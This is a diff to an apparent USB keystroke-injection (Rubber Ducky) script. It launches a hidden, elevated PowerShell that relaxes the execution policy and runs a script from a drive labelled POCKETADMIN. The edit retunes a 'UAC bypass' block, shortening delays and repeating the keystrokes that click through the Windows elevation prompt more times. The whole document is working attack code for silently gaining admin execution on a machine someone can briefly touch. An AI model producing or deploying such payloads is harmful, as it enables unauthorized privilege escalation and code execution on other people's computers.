@@ -9,10 +9,10 @@ DELAY 100
 STRING powershell Start-Process powershell { $driveletter = (Get-Volume -FileSystemLabel POCKETADMIN).DriveLetter; set-executionpolicy -Force remotesigned; powershell "${driveletter}:\insert.ps1"; } -Verb runAs -windowstyle hidden
 ENTER
 
-REM --- UAC bypass, repeated 5 times just in case GUI acts too slow ---
+REM --- UAC bypass, repeated 10 times just in case GUI acts too slow ---
 REPEAT_SIZE 4
-DELAY 1000
+DELAY 500
 LEFT
 DELAY 50
 ALT SHIFT ENTER
-REPEAT 4
+REPEAT 9
